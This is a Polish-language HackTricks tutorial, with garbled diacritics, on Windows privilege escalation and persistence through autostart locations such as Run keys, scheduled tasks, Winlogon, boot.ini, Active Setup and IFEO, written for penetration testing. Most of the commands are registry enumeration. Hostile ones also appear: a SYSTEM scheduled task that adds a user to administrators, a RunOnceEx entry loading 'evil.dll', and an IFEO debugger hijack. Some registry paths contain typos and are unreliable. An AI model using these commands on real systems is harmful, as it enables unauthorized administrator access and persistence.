# Eskalacja uprawnie≈Ñ za pomocƒÖ Autoruns

<details>

<summary><strong>Dowiedz siƒô, jak hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Je≈õli interesuje Ciƒô **kariera hakerska** i hakowanie niemo≈ºliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane bieg≈Çe pos≈Çugiwanie siƒô jƒôzykiem polskim w mowie i pi≈õmie_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** mo≈ºna u≈ºyƒá do uruchamiania program√≥w podczas **uruchamiania systemu**. Sprawd≈∫, kt√≥re pliki binarne sƒÖ zaprogramowane do uruchamiania siƒô podczas uruchamiania systemu za pomocƒÖ:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zaplanowane zadania

**Zadania** mogƒÖ byƒá zaplanowane do uruchamiania z **okre≈õlonƒÖ czƒôstotliwo≈õciƒÖ**. Sprawd≈∫, kt√≥re pliki binarne sƒÖ zaplanowane do uruchomienia za pomocƒÖ:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Foldery

Wszystkie pliki binarne znajdujƒÖce siƒô w folderach **Startup zostanƒÖ uruchomione przy starcie systemu**. Wsp√≥lne foldery startupu to te wymienione poni≈ºej, ale folder startupu jest wskazany w rejestrze. [Przeczytaj to, aby dowiedzieƒá siƒô gdzie.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Rejestr

{% hint style="info" %}
[Informacja z tego miejsca](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Wpis w rejestrze **Wow6432Node** wskazuje, ≈ºe u≈ºywasz wersji systemu Windows 64-bitowej. System operacyjny u≈ºywa tego klucza do wy≈õwietlania oddzielnego widoku HKEY\_LOCAL\_MACHINE\SOFTWARE dla aplikacji 32-bitowych uruchamianych na wersjach systemu Windows 64-bitowych.
{% endhint %}

### Uruchamianie

Powszechnie znane wpisy w rejestrze AutoRun:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Klucze rejestru o nazwach **Run** i **RunOnce** sƒÖ przeznaczone do automatycznego uruchamiania program√≥w za ka≈ºdym razem, gdy u≈ºytkownik loguje siƒô do systemu. Warto≈õƒá danych przypisana do klucza wiersza polece≈Ñ jest ograniczona do 260 znak√≥w lub mniej.

**Uruchamianie us≈Çug** (mo≈ºe kontrolowaƒá automatyczne uruchamianie us≈Çug podczas uruchamiania):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

W systemach Windows Vista i nowszych wersjach klucze rejestru **Run** i **RunOnce** nie sƒÖ generowane automatycznie. Wpisy w tych kluczach mogƒÖ bezpo≈õrednio uruchamiaƒá programy lub okre≈õlaƒá je jako zale≈ºno≈õci. Na przyk≈Çad, aby za≈Çadowaƒá plik DLL podczas logowania, mo≈ºna u≈ºyƒá klucza rejestru **RunOnceEx** wraz z kluczem "Depend". Przyk≈Çadem jest dodanie wpisu w rejestrze, kt√≥ry uruchamia "C:\\temp\\evil.dll" podczas uruchamiania systemu:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: Je≈õli mo≈ºesz zapisywaƒá w dowolnym z wymienionych kluczy rejestru w **HKLM**, mo≈ºesz podnie≈õƒá uprawnienia, gdy inny u≈ºytkownik siƒô zaloguje.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Je≈õli mo≈ºesz nadpisaƒá dowolny z binarnych plik√≥w wskazanych w kt√≥rymkolwiek z kluczy rejestru w **HKLM**, mo≈ºesz zmodyfikowaƒá ten plik binarny z tylnymi drzwiami, gdy inny u≈ºytkownik siƒô zaloguje i podnie≈õƒá uprawnienia.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### ≈öcie≈ºka uruchamiania

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skr√≥ty umieszczone w folderze **Startup** automatycznie uruchamiajƒÖ us≈Çugi lub aplikacje podczas logowania u≈ºytkownika lub ponownego uruchomienia systemu. Lokalizacja folderu **Startup** jest zdefiniowana w rejestrze zar√≥wno dla zakresu **Local Machine**, jak i **Current User**. Oznacza to, ≈ºe ka≈ºdy skr√≥t dodany do tych okre≈õlonych lokalizacji **Startup** spowoduje uruchomienie powiƒÖzanej us≈Çugi lub programu po procesie logowania lub ponownym uruchomieniu, co czyni to prostƒÖ metodƒÖ planowania automatycznego uruchamiania program√≥w.

{% hint style="info" %}
Je≈õli mo≈ºesz nadpisaƒá dowolny folder \[User] Shell w **HKLM**, bƒôdziesz m√≥g≈Ç wskazaƒá go na folder kontrolowany przez Ciebie i umie≈õciƒá tylnƒÖ furtkƒô, kt√≥ra zostanie wykonana za ka≈ºdym razem, gdy u≈ºytkownik zaloguje siƒô do systemu, podnoszƒÖc uprawnienia.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Klucze Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Zazwyczaj klucz **Userinit** jest ustawiony na **userinit.exe**. Jednak je≈õli ten klucz zostanie zmodyfikowany, okre≈õlony plik wykonywalny zostanie r√≥wnie≈º uruchomiony przez **Winlogon** po zalogowaniu u≈ºytkownika. Podobnie klucz **Shell** ma wskazywaƒá na **explorer.exe**, kt√≥ry jest domy≈õlnƒÖ pow≈ÇokƒÖ systemu Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Je≈õli mo≈ºesz nadpisaƒá warto≈õƒá rejestru lub plik binarny, bƒôdziesz w stanie podnie≈õƒá uprawnienia.
{% endhint %}

### Ustawienia polityki

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Sprawd≈∫ klucz **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Zmiana polecenia w trybie awaryjnym

W rejestrze systemu Windows, pod adresem `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, domy≈õlnie ustawiona jest warto≈õƒá **`AlternateShell`** na `cmd.exe`. Oznacza to, ≈ºe gdy wybierasz "Tryb awaryjny z wierszem polecenia" podczas uruchamiania (poprzez naci≈õniƒôcie klawisza F8), u≈ºywane jest `cmd.exe`. Jednak mo≈ºna skonfigurowaƒá komputer tak, aby automatycznie uruchamia≈Ç siƒô w tym trybie, bez konieczno≈õci naciskania F8 i rƒôcznego wybierania go.

Kroki do utworzenia opcji rozruchowej dla automatycznego uruchamiania w trybie "Tryb awaryjny z wierszem polecenia":

1. Zmie≈Ñ atrybuty pliku `boot.ini`, aby usunƒÖƒá flagi tylko do odczytu, systemowe i ukryte: `attrib c:\boot.ini -r -s -h`
2. Otw√≥rz `boot.ini` do edycji.
3. Wstaw liniƒô takƒÖ jak: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Zapisz zmiany w `boot.ini`.
5. Przywr√≥ƒá pierwotne atrybuty pliku: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Zmiana klucza rejestru **AlternateShell** umo≈ºliwia dostosowanie niestandardowego pow≈Çoki polecenia, potencjalnie dla nieautoryzowanego dostƒôpu.
- **Exploit 2 (Uprawnienia do zapisu w PATH):** Posiadanie uprawnie≈Ñ do zapisu w dowolnej czƒô≈õci zmiennej systemowej **PATH**, zw≈Çaszcza przed `C:\Windows\system32`, pozwala na wykonanie niestandardowego `cmd.exe`, kt√≥ry mo≈ºe byƒá tylnymi drzwiami, je≈õli system zostanie uruchomiony w trybie awaryjnym.
- **Exploit 3 (Uprawnienia do zapisu w PATH i boot.ini):** Uprawnienia do zapisu w `boot.ini` umo≈ºliwiajƒÖ automatyczne uruchamianie w trybie awaryjnym, u≈ÇatwiajƒÖc nieautoryzowany dostƒôp przy nastƒôpnym ponownym uruchomieniu.

Aby sprawdziƒá bie≈ºƒÖce ustawienie **AlternateShell**, u≈ºyj tych polece≈Ñ:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Zainstalowany komponent

Active Setup to funkcja w systemie Windows, kt√≥ra **inicjuje siƒô przed pe≈Çnym za≈Çadowaniem ≈õrodowiska pulpitu**. Priorytetowo wykonuje okre≈õlone polecenia, kt√≥re muszƒÖ zostaƒá zako≈Ñczone przed kontynuacjƒÖ logowania u≈ºytkownika. Ten proces zachodzi nawet przed uruchomieniem innych wpis√≥w startowych, takich jak te w sekcjach rejestru Run lub RunOnce.

Active Setup jest zarzƒÖdzany za pomocƒÖ nastƒôpujƒÖcych kluczy rejestru:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

W tych kluczach istniejƒÖ r√≥≈ºne podklucze, z kt√≥rych ka≈ºdy odpowiada okre≈õlonemu komponentowi. Warto≈õci kluczy, kt√≥re sƒÖ szczeg√≥lnie istotne, to:

- **IsInstalled:**
- `0` oznacza, ≈ºe polecenie komponentu nie zostanie wykonane.
- `1` oznacza, ≈ºe polecenie zostanie wykonane raz dla ka≈ºdego u≈ºytkownika, co jest domy≈õlnym zachowaniem, je≈õli warto≈õƒá `IsInstalled` jest brakujƒÖca.
- **StubPath:** Okre≈õla polecenie, kt√≥re ma zostaƒá wykonane przez Active Setup. Mo≈ºe to byƒá dowolna poprawna linia polece≈Ñ, na przyk≈Çad uruchomienie `notatnika`.

**Wskaz√≥wki dotyczƒÖce bezpiecze≈Ñstwa:**

- Modyfikowanie lub zapisywanie klucza, w kt√≥rym **`IsInstalled`** jest ustawione na `"1"` z okre≈õlonym **`StubPath`**, mo≈ºe prowadziƒá do nieautoryzowanego wykonania polece≈Ñ, potencjalnie umo≈ºliwiajƒÖcego eskalacjƒô uprawnie≈Ñ.
- Zmiana pliku binarnego, do kt√≥rego odwo≈Çuje siƒô warto≈õƒá **`StubPath`**, mo≈ºe r√≥wnie≈º umo≈ºliwiƒá eskalacjƒô uprawnie≈Ñ, pod warunkiem posiadania wystarczajƒÖcych uprawnie≈Ñ.

Aby sprawdziƒá konfiguracje **`StubPath`** dla komponent√≥w Active Setup, mo≈ºna u≈ºyƒá tych polece≈Ñ:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Obiekty pomocnicze przeglƒÖdarki

### PrzeglƒÖd obiekt√≥w pomocniczych przeglƒÖdarki (BHO)

Obiekty pomocnicze przeglƒÖdarki (BHO) to modu≈Çy DLL, kt√≥re dodajƒÖ dodatkowe funkcje do przeglƒÖdarki Internet Explorer firmy Microsoft. ≈ÅadujƒÖ siƒô do przeglƒÖdarki Internet Explorer i Eksploratora Windows przy ka≈ºdym uruchomieniu. Jednak ich wykonanie mo≈ºna zablokowaƒá, ustawiajƒÖc klucz **NoExplorer** na warto≈õƒá 1, co uniemo≈ºliwia ich ≈Çadowanie w przypadku wystƒÖpienia instancji Eksploratora Windows.

BHO sƒÖ kompatybilne z systemem Windows 10 za po≈õrednictwem przeglƒÖdarki Internet Explorer 11, ale nie sƒÖ obs≈Çugiwane w Microsoft Edge, domy≈õlnej przeglƒÖdarce w nowszych wersjach systemu Windows.

Aby sprawdziƒá zarejestrowane na systemie BHO, mo≈ºna sprawdziƒá nastƒôpujƒÖce klucze rejestru:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Ka≈ºdy BHO jest reprezentowany przez swoje **CLSID** w rejestrze, kt√≥ry s≈Çu≈ºy jako unikalny identyfikator. Szczeg√≥≈Çowe informacje na temat ka≈ºdego CLSID mo≈ºna znale≈∫ƒá w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Do zapytania BHO w rejestrze mo≈ºna wykorzystaƒá nastƒôpujƒÖce polecenia:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Rozszerzenia Internet Explorera

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Nale≈ºy zauwa≈ºyƒá, ≈ºe w rejestrze bƒôdzie zawarte 1 nowe wpis dla ka≈ºdej biblioteki DLL, a bƒôdzie ono reprezentowane przez **CLSID**. Informacje o CLSID mo≈ºna znale≈∫ƒá w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Sterowniki czcionek

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Otw√≥rz polecenie

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcje Wykonywania Plik√≥w Obraz√≥w

Image File Execution Options (IFEO) to mechanizm w systemie Windows, kt√≥ry umo≈ºliwia manipulacjƒô sposobem, w jaki aplikacje sƒÖ uruchamiane. Mo≈ºe byƒá wykorzystany do eskalacji uprawnie≈Ñ lokalnych.

#### Dodawanie wpis√≥w IFEO

Aby dodaƒá wpis IFEO, nale≈ºy utworzyƒá klucz rejestru o nazwie aplikacji, dla kt√≥rej chcemy zmieniƒá spos√≥b uruchamiania, w ≈õcie≈ºce `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. Nastƒôpnie, w tym kluczu, utw√≥rz podklucz o nazwie `Debugger` i ustaw jego warto≈õƒá na ≈õcie≈ºkƒô do pliku wykonywalnego, kt√≥ry zostanie uruchomiony zamiast oryginalnej aplikacji.

#### Wykorzystanie wpis√≥w IFEO do eskalacji uprawnie≈Ñ

Wykorzystanie wpis√≥w IFEO do eskalacji uprawnie≈Ñ polega na utworzeniu wpisu IFEO dla aplikacji, kt√≥ra jest uruchamiana z uprawnieniami administratora. Nastƒôpnie, w warto≈õci `Debugger`, ustawiamy ≈õcie≈ºkƒô do naszego w≈Çasnego pliku wykonywalnego, kt√≥ry zostanie uruchomiony z uprawnieniami administratora. W ten spos√≥b, gdy aplikacja zostanie uruchomiona, nasz plik wykonywalny zostanie uruchomiony zamiast niej, dajƒÖc nam uprawnienia administratora.

#### Przyk≈Çad

Aby zobrazowaƒá to na przyk≈Çadzie, za≈Ç√≥≈ºmy, ≈ºe mamy aplikacjƒô o nazwie `target.exe`, kt√≥ra jest uruchamiana z uprawnieniami administratora. Chcemy uzyskaƒá uprawnienia administratora, wiƒôc tworzymy wpis IFEO dla `target.exe` i ustawiamy warto≈õƒá `Debugger` na ≈õcie≈ºkƒô do naszego w≈Çasnego pliku wykonywalnego `evil.exe`. Gdy `target.exe` zostanie uruchomiony, zamiast niego zostanie uruchomiony `evil.exe`, dajƒÖc nam uprawnienia administratora.

#### Zabezpieczenia przed eskalacjƒÖ uprawnie≈Ñ z wykorzystaniem wpis√≥w IFEO

Aby zabezpieczyƒá siƒô przed eskalacjƒÖ uprawnie≈Ñ z wykorzystaniem wpis√≥w IFEO, mo≈ºna usunƒÖƒá niepotrzebne wpisy z klucza rejestru `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. Mo≈ºna r√≥wnie≈º ograniczyƒá uprawnienia do tego klucza, aby tylko uprawnienia administratora mia≈Çy mo≈ºliwo≈õƒá modyfikacji wpis√≥w IFEO.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Nale≈ºy zauwa≈ºyƒá, ≈ºe wszystkie strony, na kt√≥rych mo≈ºna znale≈∫ƒá autostarty, **zosta≈Çy ju≈º przeszukane przez** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Jednak dla **bardziej kompleksowej listy** plik√≥w uruchamianych automatycznie mo≈ºna u≈ºyƒá [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) z systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Wiƒôcej

**Znajd≈∫ wiƒôcej program√≥w uruchamianych automatycznie, takich jak rejestry, na stronie [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## Odwo≈Çania

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

